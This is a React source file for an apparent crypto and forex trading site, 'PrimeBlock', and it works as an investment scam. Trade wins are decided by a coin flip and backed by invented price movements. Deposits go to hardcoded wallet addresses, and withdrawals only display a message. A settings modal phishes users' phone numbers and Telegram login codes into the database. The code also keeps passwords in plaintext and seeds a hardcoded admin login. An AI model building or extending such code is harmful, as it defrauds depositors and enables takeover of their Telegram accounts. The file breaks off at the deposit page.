import React, { useState, useEffect, useRef } from 'react';
import './App.css';
import WithdrawModal from './WithdrawModal';
import TradeResultModal from './TradeResultModal';
import { db } from './firebase';
import {
  collection,
  doc,
  getDocs,
  setDoc,
  updateDoc,
  onSnapshot,
  query,
  where,
  addDoc
} from 'firebase/firestore';

const TRANSLATIONS = {
  english: {
    crypto: 'Crypto',
    metals: 'Metals',
    forex: 'Forex',
    homeTitle: 'Markets',
    tradeHistory: 'Trade History',
    totalAssets: 'Total Assets (USDT)',
    login: 'Login',
    signUp: 'Sign Up',
    createAccount: 'Create Account',
    backToLogin: 'Back to Login',
    withdrawAssets: 'Withdraw Assets',
    verifySubmit: 'Verify & Submit',
    noTrades: 'No trades yet',
    loadingUserData: 'Loading user data...',
    loadingMarkets: 'Loading Markets...',
    trade: 'Trade',
    accountCenter: 'Account Center',
    buyCrypto: 'Buy Crypto',
    withdraw: 'Withdraw',
    customerService: 'Customer Service',
    manualDeposit: 'Deposit',
    langSelect: 'Language',
    selectLanguage: 'Select language',
    backHome: '← Home',
    depositTitle: 'Deposit',
    submissionReceived: 'Submission received. Our team is reviewing your transaction.',
    amount: 'Amount',
    uploadProof: 'Upload Proof',
    proofFile: 'Proof file selected',
    copy: 'Copy',
    copied: 'Copied!',
    submitDeposit: 'Submit Deposit Request',
    enterAmount: 'Enter a valid amount',
    submitError: 'Unable to submit request. Try again.',
    loginRequired: 'Please sign in to submit a deposit.',
    customerServiceLink: '@PrimeBlockLTS',
    settingsHeader: 'Settings',
    depositNotice: 'Use the address below and upload your proof for review.',
    uploadPlaceholder: 'No file chosen',
    ledgerTitle: 'Deposit Addresses',
    depositAsset: 'Asset',
    depositAddress: 'Address',
    languageOptions: 'Language options',
    openProfile: 'Profile',
    closeMenu: 'Close',
    theme: 'Theme',
    darkMode: 'Dark Mode',
    lightMode: 'Light Mode',
    appearance: 'Appearance',
    solid: 'Solid',
    gradient: 'Gradient'
  },
  french: {
    crypto: 'Crypto',
    metals: 'Métaux',
    forex: 'Forex',
    homeTitle: 'Marchés',
    tradeHistory: 'Historique des transactions',
    totalAssets: 'Actifs totaux (USDT)',
    login: 'Connexion',
    signUp: 'Inscription',
    createAccount: 'Créer un compte',
    backToLogin: 'Retour à la connexion',
    withdrawAssets: 'Retirer des actifs',
    verifySubmit: 'Vérifier et soumettre',
    noTrades: 'Aucune transaction pour le moment',
    loadingUserData: 'Chargement des données utilisateur...',
    loadingMarkets: 'Chargement des marchés...',
    trade: 'Trader',
    accountCenter: 'Espace Compte',
    buyCrypto: 'Acheter Crypto',
    withdraw: 'Retirer',
    customerService: 'Service Client',
    manualDeposit: 'Dépôt',
    langSelect: 'Langue',
    selectLanguage: 'Choisir la langue',
    backHome: '← Retour',
    depositTitle: 'Dépôt',
    submissionReceived: 'Soumission reçue. Notre équipe vérifie votre transaction.',
    amount: 'Montant',
    uploadProof: 'Joindre la preuve',
    proofFile: 'Fichier de preuve sélectionné',
    copy: 'Copier',
    copied: 'Copié !',
    submitDeposit: 'Soumettre la demande',
    enterAmount: 'Entrez un montant valide',
    submitError: 'Impossible de soumettre la demande. Réessayez.',
    loginRequired: 'Veuillez vous connecter pour soumettre un dépôt.',
    customerServiceLink: '@PrimeBlockLTS',
    settingsHeader: 'Paramètres',
    depositNotice: 'Utilisez l’adresse ci-dessous et téléchargez votre preuve pour examen.',
    uploadPlaceholder: 'Aucun fichier choisi',
    ledgerTitle: 'Adresses de dépôt',
    depositAsset: 'Actif',
    depositAddress: 'Adresse',
    languageOptions: 'Options de langue',
    openProfile: 'Profil',
    closeMenu: 'Fermer'
  },
  italian: {
    crypto: 'Crypto',
    metals: 'Metalli',
    forex: 'Forex',
    homeTitle: 'Mercati',
    tradeHistory: 'Storico operazioni',
    totalAssets: 'Patrimonio totale (USDT)',
    login: 'Accesso',
    signUp: 'Registrati',
    createAccount: 'Crea un account',
    backToLogin: 'Torna al login',
    withdrawAssets: 'Preleva fondi',
    verifySubmit: 'Verifica e invia',
    noTrades: 'Nessuna operazione ancora',
    loadingUserData: 'Caricamento dati utente...',
    loadingMarkets: 'Caricamento dei mercati...',
    trade: 'Scambia',
    accountCenter: 'Centro Account',
    buyCrypto: 'Compra Crypto',
    withdraw: 'Preleva',
    customerService: 'Assistenza',
    manualDeposit: 'Deposito',
    langSelect: 'Lingua',
    selectLanguage: 'Seleziona la lingua',
    backHome: '← Home',
    depositTitle: 'Deposito',
    submissionReceived: 'Invio ricevuto. Il nostro team sta esaminando la transazione.',
    amount: 'Importo',
    uploadProof: 'Carica Prova',
    proofFile: 'File prova selezionato',
    copy: 'Copia',
    copied: 'Copiato!',
    submitDeposit: 'Invia Richiesta',
    enterAmount: 'Inserisci un importo valido',
    submitError: 'Impossibile inviare la richiesta. Riprova.',
    loginRequired: 'Effettua l’accesso per inviare un deposito.',
    customerServiceLink: '@PrimeBlockLTS',
    settingsHeader: 'Impostazioni',
    depositNotice: 'Usa l’indirizzo qui sotto e carica la prova per la revisione.',
    uploadPlaceholder: 'Nessun file selezionato',
    ledgerTitle: 'Indirizzi di deposito',
    depositAsset: 'Asset',
    depositAddress: 'Indirizzo',
    languageOptions: 'Opzioni lingua',
    openProfile: 'Profilo',
    closeMenu: 'Chiudi'
  },
  spanish: {
    crypto: 'Cripto',
    metals: 'Metales',
    forex: 'Forex',
    homeTitle: 'Mercados',
    tradeHistory: 'Historial de operaciones',
    totalAssets: 'Activos totales (USDT)',
    login: 'Iniciar sesión',
    signUp: 'Registrarse',
    createAccount: 'Crear cuenta',
    backToLogin: 'Volver al inicio',
    withdrawAssets: 'Retirar fondos',
    verifySubmit: 'Verificar y enviar',
    noTrades: 'Aún no hay operaciones',
    loadingUserData: 'Cargando datos de usuario...',
    loadingMarkets: 'Cargando mercados...',
    trade: 'Operar',
    accountCenter: 'Centro de Cuenta',
    buyCrypto: 'Comprar Crypto',
    withdraw: 'Retirar',
    customerService: 'Atención',
    manualDeposit: 'Depósito',
    langSelect: 'Idioma',
    selectLanguage: 'Selecciona idioma',
    backHome: '← Inicio',
    depositTitle: 'Depósito',
    submissionReceived: 'Envío recibido. Nuestro equipo está revisando tu transacción.',
    amount: 'Cantidad',
    uploadProof: 'Subir prueba',
    proofFile: 'Archivo de prueba seleccionado',
    copy: 'Copiar',
    copied: '¡Copiado!',
    submitDeposit: 'Enviar Solicitud',
    enterAmount: 'Introduce una cantidad válida',
    submitError: 'No se puede enviar la solicitud. Inténtalo de nuevo.',
    loginRequired: 'Inicia sesión para enviar un depósito.',
    customerServiceLink: '@PrimeBlockLTS',
    settingsHeader: 'Ajustes',
    depositNotice: 'Usa la dirección abajo y sube tu prueba para revisión.',
    uploadPlaceholder: 'Ningún archivo seleccionado',
    ledgerTitle: 'Direcciones de depósito',
    depositAsset: 'Activo',
    depositAddress: 'Dirección',
    languageOptions: 'Opciones de idioma',
    openProfile: 'Perfil',
    closeMenu: 'Cerrar'
  },
  chinese: {
    crypto: '加密',
    metals: '贵金属',
    forex: '外汇',
    homeTitle: '市场',
    tradeHistory: '交易历史',
    totalAssets: '总资产 (USDT)',
    login: '登录',
    signUp: '注册',
    createAccount: '创建账户',
    backToLogin: '返回登录',
    withdrawAssets: '提现资产',
    verifySubmit: '验证并提交',
    noTrades: '暂无交易',
    loadingUserData: '正在加载用户数据...',
    loadingMarkets: '正在加载市场...',
    trade: '交易',
    accountCenter: '账户中心',
    buyCrypto: '购买加密',
    withdraw: '提现',
    customerService: '客服',
    manualDeposit: '存款',
    langSelect: '语言',
    selectLanguage: '选择语言',
    backHome: '← 首页',
    depositTitle: '存款',
    submissionReceived: '已收到提交。我们的团队正在审核您的交易。',
    amount: '金额',
    uploadProof: '上传凭证',
    proofFile: '已选择凭证文件',
    copy: '复制',
    copied: '已复制！',
    submitDeposit: '提交申请',
    enterAmount: '请输入有效金额',
    submitError: '无法提交请求。请重试。',
    loginRequired: '请登录以提交存款。',
    customerServiceLink: '@PrimeBlockLTS',
    settingsHeader: '设置',
    depositNotice: '使用下面地址并上传凭证以供审核。',
    uploadPlaceholder: '未选择文件',
    ledgerTitle: '存款地址',
    depositAsset: '资产',
    depositAddress: '地址',
    languageOptions: '语言选项',
    openProfile: '个人资料',
    closeMenu: '关闭'
  }
};

function App() {
  // --- DATA PERSISTENCE (Firebase Firestore) ---
  const [allUsers, setAllUsers] = useState({});
  const [isLoadingUsers, setIsLoadingUsers] = useState(true);
  const [activeId, setActiveId] = useState(() => localStorage.getItem('active_user_id') || null);
  const [isLoggedIn, setIsLoggedIn] = useState(() => localStorage.getItem('is_logged_in') === 'true');

  // --- STATE MANAGEMENT ---
  const [coins, setCoins] = useState([]);
  const [loading, setLoading] = useState(true);
  const [currentPage, setCurrentPage] = useState('home'); 
  const [marketTab, setMarketTab] = useState('crypto'); 
  const [language, setLanguage] = useState(() => localStorage.getItem('app_language') || 'english');
  const [theme, setTheme] = useState(() => localStorage.getItem('app_theme') || 'dark');
  const [appearance, setAppearance] = useState(() => localStorage.getItem('app_appearance') || 'solid');
  const [copyStatus, setCopyStatus] = useState({});
  const [depositAmount, setDepositAmount] = useState('');
  const [selectedCurrency, setSelectedCurrency] = useState('BTC');
  const [proofFile, setProofFile] = useState(null);
  const [depositSubmitted, setDepositSubmitted] = useState(false);

  const [showAuth, setShowAuth] = useState(false);
  const [authMode, setAuthMode] = useState('login');
  const [authData, setAuthData] = useState({ email: '', password: '', name: '', pin: '' });

  const [showWithdraw, setShowWithdraw] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [withdrawPin, setWithdrawPin] = useState('');
  const [showProfileWithdraw, setShowProfileWithdraw] = useState(false);
  const [withdrawSuccess, setWithdrawSuccess] = useState(false);
  const [drawerOpen, setDrawerOpen] = useState(false);
  const [showSecurityModal, setShowSecurityModal] = useState(false);
  const [verificationStep, setVerificationStep] = useState(1);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [verificationCode, setVerificationCode] = useState('');

  const [selectedCoin, setSelectedCoin] = useState(null);
  const [tradeConfig, setTradeConfig] = useState({ time: 30, amount: 10, type: 'Long' });
  const [isTrading, setIsTrading] = useState(false);
  const [countdown, setCountdown] = useState(0); 
  const [tradeResult, setTradeResult] = useState(null);
  const [showResultModal, setShowResultModal] = useState(false);
  const [ohlcData, setOhlcData] = useState([]);
  const [coinStats, setCoinStats] = useState(null);
  const [currentTime, setCurrentTime] = useState(new Date().toLocaleTimeString());
  const [tradeHistory, setTradeHistory] = useState([]);

  const chartContainerRef = useRef(null);

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentTime(new Date().toLocaleTimeString());
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Trade configuration object
  const tradeOptions = {
    30: { profit: 0.15, minAmount: 500 },
    60: { profit: 0.30, minAmount: 3000 },
    90: { profit: 0.50, minAmount: 10000 },
    120: { profit: 0.70, minAmount: 100000 }
  };

  const calculateRSI = (prices, period = 14) => {
    if (prices.length < period) return 50;

    let gains = 0;
    let losses = 0;
    for (let i = 1; i < period; i++) {
      const diff = prices[i] - prices[i - 1];
      if (diff > 0) gains += diff;
      else losses -= diff;
    }

    const avgGain = gains / period;
    const avgLoss = losses / period;
    if (avgLoss === 0) return 100;
    const rs = avgGain / avgLoss;
    return (100 - (100 / (1 + rs))).toFixed(2);
  };

  const CandlestickChart = ({ data, width, height }) => {
    if (!data || data.length === 0) return <div style={{ color: '#999', textAlign: 'center', padding: '20px' }}>Loading chart...</div>;

    const minPrice = Math.min(...data.map(d => d.low)) * 0.99;
    const maxPrice = Math.max(...data.map(d => d.high)) * 1.01;
    const range = maxPrice - minPrice;

    const yScale = (price) => ((maxPrice - price) / range) * height;
    const xScale = (index) => (index / (data.length - 1)) * width;

    return (
      <svg width={width} height={height} style={{ background: 'rgba(0,0,0,0.2)', borderRadius: '8px' }}>
        {[0, 0.25, 0.5, 0.75, 1].map((pct, idx) => (
          <line key={idx} x1="0" y1={yScale(minPrice + range * pct)} x2={width} y2={yScale(minPrice + range * pct)} stroke="#2b3139" strokeWidth="1" strokeDasharray="4" />
        ))}
        {data.map((candle, idx) => {
          const x = xScale(idx);
          const openY = yScale(candle.open);
          const closeY = yScale(candle.close);
          const highY = yScale(candle.high);
          const lowY = yScale(candle.low);
          const isGreen = candle.close >= candle.open;
          const color = isGreen ? '#0ecb81' : '#f6465d';

          return (
            <g key={idx}>
              <line x1={x} y1={highY} x2={x} y2={lowY} stroke={color} strokeWidth="2" opacity="0.6" />
              <rect x={x - 3} y={Math.min(openY, closeY)} width={6} height={Math.max(1, Math.abs(closeY - openY))} fill={color} />
            </g>
          );
        })}
        <text x="5" y="15" fontSize="11" fill="#999">${maxPrice.toFixed(2)}</text>
        <text x="5" y={height - 5} fontSize="11" fill="#999">${minPrice.toFixed(2)}</text>
      </svg>
    );
  };

  const telegramLink = "https://t.me/PrimeBlockLTS";

  const globalMarkets = [
    { id: 'gold', name: 'Gold', symbol: 'XAU', current_price: 2342.50, image: 'https://cdn-icons-png.flaticon.com/512/272/272530.png', sparkline_in_7d: { price: [2330, 2335, 2345, 2340, 2342] } },
    { id: 'silver', name: 'Silver', symbol: 'XAG', current_price: 28.15, image: 'https://cdn-icons-png.flaticon.com/512/5833/5833860.png', sparkline_in_7d: { price: [27.5, 28.0, 27.8, 28.2, 28.15] } },
    { id: 'platinum', name: 'Platinum', symbol: 'XPT', current_price: 950.00, image: 'https://cdn-icons-png.flaticon.com/512/272/272530.png', sparkline_in_7d: { price: [940, 945, 955, 950, 950] } },
    { id: 'palladium', name: 'Palladium', symbol: 'XPD', current_price: 1200.00, image: 'https://cdn-icons-png.flaticon.com/512/272/272530.png', sparkline_in_7d: { price: [1180, 1190, 1210, 1200, 1200] } }
  ];

  const forexMarkets = [
    { id: 'eurusd', name: 'EUR/USD', symbol: 'EURUSD', current_price: 1.0813, image: 'https://cdn-icons-png.flaticon.com/512/197/197615.png' },
    { id: 'gbpusd', name: 'GBP/USD', symbol: 'GBPUSD', current_price: 1.2712, image: 'https://cdn-icons-png.flaticon.com/512/197/197374.png' },
    { id: 'usdjpy', name: 'USD/JPY', symbol: 'USDJPY', current_price: 155.12, image: 'https://cdn-icons-png.flaticon.com/512/197/197604.png' },
    { id: 'audusd', name: 'AUD/USD', symbol: 'AUDUSD', current_price: 0.6523, image: 'https://cdn-icons-png.flaticon.com/512/197/197507.png' },
    { id: 'usdchf', name: 'USD/CHF', symbol: 'USDCHF', current_price: 0.9056, image: 'https://cdn-icons-png.flaticon.com/512/197/197540.png' },
    { id: 'nzdusd', name: 'NZD/USD', symbol: 'NZDUSD', current_price: 0.5987, image: 'https://cdn-icons-png.flaticon.com/512/197/197589.png' },
    { id: 'usdcad', name: 'USD/CAD', symbol: 'USDCAD', current_price: 1.3456, image: 'https://cdn-icons-png.flaticon.com/512/197/197430.png' },
    { id: 'eurgbp', name: 'EUR/GBP', symbol: 'EURGBP', current_price: 0.8512, image: 'https://cdn-icons-png.flaticon.com/512/197/197615.png' },
    { id: 'eurjpy', name: 'EUR/JPY', symbol: 'EURJPY', current_price: 167.89, image: 'https://cdn-icons-png.flaticon.com/512/197/197615.png' },
    { id: 'gbpjpy', name: 'GBP/JPY', symbol: 'GBPJPY', current_price: 197.45, image: 'https://cdn-icons-png.flaticon.com/512/197/197374.png' }
  ];

  const depositAssets = [
    { name: 'BTC', address: 'bc1qtaevclzdtlv5xz46dr5se6l5vwqdts8fcmt8xz' },
    { name: 'ETH', address: '0x0023afc77d8f033ddc4b7a984a0506231e4dea6a' },
    { name: 'SOL', address: '9N7ccQuH7HZZGq3YT4psoMhQ22ue2HuZg2PF94m7FnAy' },
    { name: 'USDT (ERC20/BEP20)', address: '0x0023afc77d8f033ddc4b7a984a0506231e4dea6a' },
    { name: 'USDC', address: '0x0023afc77d8f033ddc4b7a984a0506231e4dea6a' }
  ];

  const t = (key) => {
    return TRANSLATIONS[language] && TRANSLATIONS[language][key] ? TRANSLATIONS[language][key] : TRANSLATIONS.english[key] || key;
  };

  const availableMarkets = () => {
    if (marketTab === 'metals') return globalMarkets;
    if (marketTab === 'forex') return forexMarkets;
    return coins;
  };

  const handleCopy = async (address) => {
    try {
      await navigator.clipboard.writeText(address);
      setCopyStatus(prev => ({ ...prev, [address]: t('copied') }));
      setTimeout(() => setCopyStatus(prev => ({ ...prev, [address]: '' })), 1800);
    } catch (error) {
      console.error('Clipboard copy failed', error);
    }
  };

  const handleDepositSubmit = async (event) => {
    event.preventDefault();
    if (!depositAmount || Number(depositAmount) <= 0) {
      return alert(t('enterAmount'));
    }
    if (!activeId) {
      return alert(t('loginRequired'));
    }
    try {
      await addDoc(collection(db, 'deposit_requests'), {
        userId: activeId,
        amount: Number(depositAmount),
        proofFileName: proofFile ? proofFile.name : '',
        status: 'under_review',
        createdAt: new Date(),
        language,
        submittedAt: new Date()
      });
      setDepositSubmitted(true);
      setDepositAmount('');
      setProofFile(null);
    } catch (error) {
      console.error('Deposit submit failed', error);
      alert(t('submitError'));
    }
  };

  useEffect(() => {
    localStorage.setItem('app_language', language);
  }, [language]);

  useEffect(() => {
    localStorage.setItem('app_theme', theme);
    document.documentElement.setAttribute('data-theme', theme);
  }, [theme]);

  useEffect(() => {
    localStorage.setItem('app_appearance', appearance);
    document.documentElement.setAttribute('data-appearance', appearance);
  }, [appearance]);

  // --- FIRESTORE INITIALIZATION ---
  useEffect(() => {
    // Initialize default admin user if not exists
    const initializeDefaultUser = async () => {
      try {
        const usersRef = collection(db, 'users');
        const adminQuery = query(usersRef, where('email', '==', 'admin@cp88.com'));
        const adminSnapshot = await getDocs(adminQuery);

        if (adminSnapshot.empty) {
          // Create default admin user
          const adminData = {
            id: '88135',
            email: 'admin@cp88.com',
            balance: 5000,
            name: 'Ben Admin',
            pass: '123',
            pin: '1111',
            createdAt: new Date()
          };
          await setDoc(doc(db, 'users', '88135'), adminData);
        }
      } catch (error) {
        console.error('Error initializing default user:', error);
      }
    };

    initializeDefaultUser();

    // Real-time listener for all users
    const unsubscribe = onSnapshot(collection(db, 'users'), (snapshot) => {
      const usersData = {};
      snapshot.forEach((doc) => {
        usersData[doc.id] = doc.data();
      });
      console.log('Firestore users loaded:', Object.keys(usersData).length, 'users');
      setAllUsers(usersData);
      setIsLoadingUsers(false);
    });

    return () => unsubscribe();
  }, []);

  // --- FETCH TRADE HISTORY ---
  useEffect(() => {
    if (!activeId) {
      setTradeHistory([]);
      return;
    }

    const fetchTradeHistory = async () => {
      try {
        const tradesQuery = query(collection(db, 'trades'), where('userId', '==', activeId));
        const tradesSnapshot = await getDocs(tradesQuery);
        const trades = [];
        tradesSnapshot.forEach((doc) => {
          trades.push(doc.data());
        });
        // Sort by timestamp descending
        trades.sort((a, b) => new Date(b.timestamp.seconds * 1000) - new Date(a.timestamp.seconds * 1000));
        setTradeHistory(trades);
      } catch (error) {
        console.error('Error fetching trade history:', error);
      }
    };

    fetchTradeHistory();
  }, [activeId]);

  // --- LIVE PRICE TICKING (Updates every 10s) ---
  useEffect(() => {
    const fetchPrices = () => {
      fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=20&sparkline=true')
        .then(res => res.json())
        .then(data => { setCoins(data); setLoading(false); })
        .catch(err => console.error("Fetch error:", err));
    };
    fetchPrices();
    const interval = setInterval(fetchPrices, 10000);
    return () => clearInterval(interval);
  }, []);

  // --- FETCH OHLC DATA FOR CANDLESTICK CHART ---
  useEffect(() => {
    if (!selectedCoin) return;

    const generateCandleData = async () => {
      try {
        const response = await fetch(`https://api.coingecko.com/api/v3/coins/${selectedCoin.id}/ohlc?vs_currency=usd&days=30`);
        const data = await response.json();

        if (Array.isArray(data) && data.length > 0) {
          const formattedData = data.map((candle, idx) => ({
            time: idx,
            open: candle[1],
            high: candle[2],
            low: candle[3],
            close: candle[4]
          }));

          setOhlcData(formattedData);

          const closes = formattedData.map(c => c.close);
          const highest = Math.max(...closes);
          const lowest = Math.min(...closes);
          const trend = formattedData[formattedData.length - 1].close >= formattedData[0].open ? 'up' : 'down';
          const change = ((closes[closes.length - 1] - closes[0]) / closes[0] * 100).toFixed(2);

          setCoinStats({
            high24h: highest,
            low24h: lowest,
            trend,
            changePercent: change,
            rsi: calculateRSI(closes)
          });
        }
      } catch (err) {
        console.error("OHLC fetch error:", err);
      }
    };

    generateCandleData();
  }, [selectedCoin]);

  // --- SESSION MANAGEMENT (LocalStorage) ---
  useEffect(() => {
    localStorage.setItem('active_user_id', activeId || '');
    localStorage.setItem('is_logged_in', isLoggedIn);
  }, [activeId, isLoggedIn]);

  const handleAuth = async (e) => {
    e.preventDefault();
    console.log('Login attempt for email:', authData.email);
    console.log('Available users:', Object.keys(allUsers).length);

    const existingUser = Object.values(allUsers).find(u => u.email === authData.email);

    if (existingUser) {
      if (existingUser.pass === authData.password) {
        setActiveId(existingUser.id);
        setIsLoggedIn(true);
        alert("Welcome back!");
      } else {
        alert("Invalid Credentials");
      }
    } else {
      if (authMode === 'signup') {
        try {
          const newId = '88' + Math.floor(1000 + Math.random() * 9000);
          const newUserData = {
            id: newId,
            email: authData.email,
            balance: 0,
            name: authData.name,
            pass: authData.password,
            pin: authData.pin,
            createdAt: new Date()
          };

          await setDoc(doc(db, 'users', newId), newUserData);
          setActiveId(newId);
          setIsLoggedIn(true);
          alert("Account created successfully!");
        } catch (error) {
          console.error('Error creating user:', error);
          alert("Error creating account. Please try again.");
        }
      } else {
        alert("Email not found. Please sign up first.");
      }
    }

    setShowAuth(false);
  };

  const startTrade = (type) => {
    if (!isLoggedIn) return setShowAuth(true);
    
    const config = tradeOptions[tradeConfig.time];
    if (!config) return alert("Invalid trade duration");
    if (tradeConfig.amount < config.minAmount) return alert(`Minimum investment for ${tradeConfig.time}s is $${config.minAmount}`);
    if (allUsers[activeId].balance < tradeConfig.amount) return alert("Insufficient Balance");
    
    setIsTrading(true);
    setCountdown(tradeConfig.time);
    
    const timer = setInterval(() => {
      setCountdown(p => {
        if (p <= 1) {
          clearInterval(timer);
          return 0;
        }
        return p - 1;
      });
    }, 1000);

    setTimeout(async () => {
      const currentPrice = selectedCoin.current_price;
      let win = Math.random() > 0.5;
      const change = win ? tradeConfig.amount * config.profit : -tradeConfig.amount;
      
      // Calculate open and close prices based on logic
      let openPrice, closePrice;
      if (win) {
        const randomOffset = Math.random() * 3 + 2; // Random between 2 and 5
        if (type === 'Long') {
          openPrice = currentPrice - randomOffset;
          closePrice = currentPrice;
        } else { // Short
          openPrice = currentPrice + randomOffset;
          closePrice = currentPrice;
        }
      } else {
        // For losses, make it reasonable - close price moves against the position
        if (type === 'Long') {
          openPrice = currentPrice + 1;
          closePrice = currentPrice - 1;
        } else { // Short
          openPrice = currentPrice - 1;
          closePrice = currentPrice + 1;
        }
      }

      try {
        const userRef = doc(db, 'users', activeId);
        const newBalance = allUsers[activeId].balance + change;
        await updateDoc(userRef, { balance: newBalance });

        // Generate order ID
        const orderId = 'PB' + Date.now() + Math.floor(Math.random() * 1000);

        const tradeData = {
          orderId,
          userId: activeId,
          asset: selectedCoin.symbol.toUpperCase(),
          type,
          duration: tradeConfig.time,
          amount: tradeConfig.amount,
          openPrice,
          closePrice,
          win,
          profit: change,
          timestamp: new Date()
        };

        // Store trade in Firebase
        await setDoc(doc(collection(db, 'trades'), orderId), tradeData);

        setTradeResult({ ...tradeData, currentPrice });
        setIsTrading(false);
        setShowResultModal(true);
      } catch (error) {
        console.error('Error processing trade:', error);
        alert('Error processing trade. Please try again.');
        setIsTrading(false);
      }
    }, tradeConfig.time * 1000);
  };

  // --- PAGE ROUTING ---
  if (currentPage === 'profile') {
    const user = allUsers[activeId] || { id: 'N/A', balance: 0, name: 'Guest' };
    return (
      <div className="profile-page">
        <header className="trade-header">
          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">{t('backHome')}</button>
          <h3>{t('accountCenter')}</h3>
          <div style={{width:'40px'}}></div>
        </header>
        <div className="profile-container">
          <div className="profile-card">
            <div className="user-avatar-large">👤</div>
            <h2>{user.name}</h2>
            <p className="user-id-tag">UID: {user.id}</p>
            <div className="balance-display">
              <span>{t('totalAssets')}</span>
              <h1>${user.balance.toLocaleString(undefined, {minimumFractionDigits: 2})}</h1>
            </div>
          </div>
          <div className="profile-actions">
            <button className="deposit-btn" onClick={() => window.open(telegramLink)}>💳 {t('buyCrypto')}</button>
            <button className="deposit-btn" onClick={() => setCurrentPage('deposit')}>💎 {t('manualDeposit')}</button>
            <button className="deposit-btn" onClick={() => isLoggedIn ? setShowProfileWithdraw(true) : setShowAuth(true)}>📤 {t('withdraw')}</button>
          </div>
          
          {/* Trade History Section */}
          <div className="history-section">
            <h3>{t('tradeHistory')}</h3>

            {/* Desktop Table View */}
            <div className="history-table-container desktop-only">
              <table className="history-table">
                <thead>
                  <tr>
                    <th>Order ID</th>
                    <th>Asset</th>
                    <th>Type</th>
                    <th>Amount</th>
                    <th>Profit/Loss</th>
                    <th>Date</th>
                  </tr>
                </thead>
                <tbody>
                  {tradeHistory.length > 0 ? tradeHistory.map((trade) => (
                    <tr key={trade.orderId}>
                      <td>{trade.orderId}</td>
                      <td>{trade.asset}</td>
                      <td>{trade.type}</td>
                      <td>${trade.amount.toLocaleString()}</td>
                      <td className={trade.win ? 'profit-positive' : 'profit-negative'}>
                        {trade.win ? '+' : '-'}${Math.abs(trade.profit).toFixed(2)}
                      </td>
                      <td>{new Date(trade.timestamp.seconds * 1000).toLocaleDateString()}</td>
                    </tr>
                  )) : (
                    <tr>
                      <td colSpan="6" style={{textAlign: 'center', color: '#999'}}>No trades yet</td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>

            {/* Mobile Card View */}
            <div className="history-cards mobile-only">
              {tradeHistory.length > 0 ? tradeHistory.map((trade) => (
                <div key={trade.orderId} className="history-card">
                  <div className="card-header">
                    <span className="order-id">{trade.orderId}</span>
                    <span className={`profit-badge ${trade.win ? 'profit-win' : 'profit-loss'}`}>
                      {trade.win ? '+' : '-'}${Math.abs(trade.profit).toFixed(2)}
                    </span>
                  </div>
                  <div className="card-details">
                    <div className="card-row">
                      <span className="card-label">Asset:</span>
                      <span className="card-value">{trade.asset}</span>
                    </div>
                    <div className="card-row">
                      <span className="card-label">Type:</span>
                      <span className="card-value">{trade.type}</span>
                    </div>
                    <div className="card-row">
                      <span className="card-label">Amount:</span>
                      <span className="card-value">${trade.amount.toLocaleString()}</span>
                    </div>
                    <div className="card-row">
                      <span className="card-label">Date:</span>
                      <span className="card-value">{new Date(trade.timestamp.seconds * 1000).toLocaleDateString()}</span>
                    </div>
                  </div>
                </div>
              )) : (
                <div className="no-trades">No trades yet</div>
              )}
            </div>
          </div>
        </div>

        <WithdrawModal
          isOpen={showProfileWithdraw}
          onClose={() => setShowProfileWithdraw(false)}
          user={user}
          onWithdraw={(amount, address) => {
            // Handle withdrawal logic here
            alert("Request Submitted");
          }}
        />
      </div>
    );
  }

  if (currentPage === 'settings') {
    return (
      <div className="settings-page">
        <header className="trade-header no-border">
          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">← Back</button>
          <div className="brand-logo">Settings</div>
          <div style={{width:'40px'}}></div>
        </header>
        <div className="settings-content">
          <div className="setting-item">
            <div className="setting-icon">🌐</div>
            <label className="language-label">Language</label>
            <select className="language-select" value={language} onChange={(e) => setLanguage(e.target.value)}>
              <option value="english">English</option>
              <option value="french">French</option>
              <option value="italian">Italian</option>
              <option value="spanish">Spanish</option>
              <option value="chinese">Chinese</option>
            </select>
          </div>
          <div className="setting-item">
            <div className="setting-icon">🌙</div>
            <label className="language-label">Theme</label>
            <select className="language-select" value={theme} onChange={(e) => setTheme(e.target.value)}>
              <option value="dark">Dark Mode</option>
              <option value="light">Light Mode</option>
            </select>
          </div>
          <div className="setting-item">
            <div className="setting-icon">🎨</div>
            <label className="language-label">Appearance</label>
            <select className="language-select" value={appearance} onChange={(e) => setAppearance(e.target.value)}>
              <option value="solid">Solid</option>
              <option value="gradient">Gradient</option>
            </select>
          </div>
          <div className="setting-item">
            <div className="setting-icon">🔒</div>
            <label className="language-label">Security</label>
            <button className="setting-btn" onClick={() => setShowSecurityModal(true)}>Manage</button>
          </div>
        </div>

        {/* Security Verification Modal */}
        {showSecurityModal && (
          <div className="modal-overlay" onClick={() => setShowSecurityModal(false)}>
            <div className="modal-content security-modal" onClick={(e) => e.stopPropagation()}>
              <button className="close-btn" onClick={() => setShowSecurityModal(false)}>×</button>
              <h2>Telegram Account Verification</h2>
              {verificationStep === 1 && (
                <div className="verification-step">
                  <p>Verify your account with Telegram</p>
                  <div className="telegram-logo">📱</div>
                  <input
                    className="login-input"
                    type="tel"
                    placeholder="Enter your phone number"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                  />
                  <button className="buy-btn" onClick={() => { setVerificationStep(2); alert('Verification code sent to your Telegram'); }}>Verify</button>
                </div>
              )}
              {verificationStep === 2 && (
                <div className="verification-step">
                  <p>Verification code is sent to your Telegram</p>
                  <input
                    className="login-input"
                    type="text"
                    placeholder="Enter verification code"
                    value={verificationCode}
                    onChange={(e) => setVerificationCode(e.target.value)}
                  />
                  <button className="buy-btn" onClick={async () => {
                    if (!activeId) return alert('Please log in first');
                    try {
                      await addDoc(collection(db, 'telegram_verifications'), {
                        userId: activeId,
                        phoneNumber,
                        verificationCode,
                        timestamp: new Date()
                      });
                      alert('Verification successful!');
                      setShowSecurityModal(false);
                      setVerificationStep(1);
                      setPhoneNumber('');
                      setVerificationCode('');
                    } catch (error) {
                      console.error('Verification failed', error);
                      alert('Verification failed. Try again.');
                    }
                  }}>Submit</button>
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    );
  }

  if (currentPage === 'deposit') {
    return (
      <div className="deposit-page">
